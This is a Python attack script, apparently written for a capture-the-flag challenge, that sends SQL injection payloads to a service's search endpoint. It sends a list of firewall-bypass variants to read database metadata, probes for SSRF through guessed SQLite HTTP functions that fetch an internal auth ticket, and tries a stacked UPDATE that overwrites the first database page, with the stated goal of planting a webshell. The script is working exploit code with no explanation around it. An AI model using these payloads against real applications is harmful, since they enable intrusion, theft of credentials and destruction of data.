"""
Try to use SQLi to read files on the filesystem.
Since ATTACH is blocked (multi-statement), try other approaches:
1. Check if there are any custom functions
2. Try writing to sqlite_dbpage to create a webshell
3. Try reading /app files via creative SQL
"""
from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

# Try to get database file path
print("=== Getting database file path ===")
# Use sqlite_dbpage to check page 1 header for database filename
res = c.request("search", {"q": "' UNION SELECT 1, cast(file FROM pragma\n_database_list) as text, 2--"})
print(f"pragma_database_list: {res.get('error', json.dumps(res)[:200])}")

# Try different WAF bypass for pragma_database_list
# The WAF blocks "pragma_" but not "PRAGMA " (keyword)
# In SQLite, PRAGMA database_list; works but we can't do multi-statement
# However, pragma_database_list is a table-valued function

# Try with comment bypass
bypasses = [
    "' UNION SELECT 1, file, name FROM pragma_database_list--",
    "' UNION SELECT 1, file, name FROM /**/pragma_database_list--",
    "' UNION SELECT 1, file, name FROM [pragma_database_list]--",
    "' UNION SELECT 1, file, name FROM `pragma_database_list`--",
    "' UNION SELECT 1, file, name FROM \"pragma_database_list\"--",
    "' UNION SELECT 1, file, name FROM pragma_database_list()--",
]

for b in bypasses:
    res = c.request("search", {"q": b})
    err = res.get("error", "")
    if res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        print(f"  SUCCESS: {b[:50]}... -> {rows}")
    elif "this is not for u" not in err:
        print(f"  {b[:50]}... -> {err[:80]}")

# Try with hex/char encoding of "pragma_"
# p=0x70 r=0x72 a=0x61 g=0x67 m=0x6d _=0x5f
print("\n=== Trying char() concat for table name ===")
res = c.request("search", {"q": "' UNION SELECT 1, 2, 3 FROM (SELECT * FROM sqlite_master WHERE type='table' AND name LIKE char(112,114,97,103,109,97)||'%')--"})
print(f"char concat: {res.get('error', json.dumps(res)[:200])}")

# What about using the encrypted pcap data?
# We have the client and server public keys from pcaps.
# But we DON'T have the ECDH private keys.
# UNLESS... the pcap contains the raw DH computation?

# Let's try one more thing: SSRF via SQLi
# Some SQLite builds support HTTP extensions
print("\n=== Testing HTTP extensions ===")
http_funcs = [
    "http_get('http://127.0.0.1:8080/api/auth/ticket')",
    "http('GET','http://127.0.0.1:8080/api/auth/ticket')",
    "url('http://127.0.0.1:8080/api/auth/ticket')",
    "fetch('http://127.0.0.1:8080/api/auth/ticket')",
    "curl('http://127.0.0.1:8080/api/auth/ticket')",
    "httpd('http://127.0.0.1:8080/')",
]

for f in http_funcs:
    q = f"' UNION SELECT 1, cast({f} as text), 3--"
    res = c.request("search", {"q": q})
    err = res.get("error", "")
    if "no such function" not in err and not res.get("ok"):
        print(f"  {f[:50]:50s} -> {err[:80]}")
    elif res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        print(f"  FOUND: {f[:50]} -> {rows}")

# Try to WRITE to sqlite_dbpage (writable virtual table!)
print("\n=== Testing sqlite_dbpage write ===")
# First check if we can UPDATE
res = c.request("search", {"q": "' ; UPDATE sqlite_dbpage SET data=x'00' WHERE pgno=1--"})
print(f"UPDATE dbpage: {res.get('error', 'OK')}")

# Try INSERT/REPLACE via UNION
res = c.request("search", {"q": "' UNION SELECT 1, 2, 3 WHERE 1=0 UNION ALL SELECT * FROM sqlite_dbpage WHERE 0--"})
print(f"UNION dbpage: {res.get('error', json.dumps(res)[:100])}")
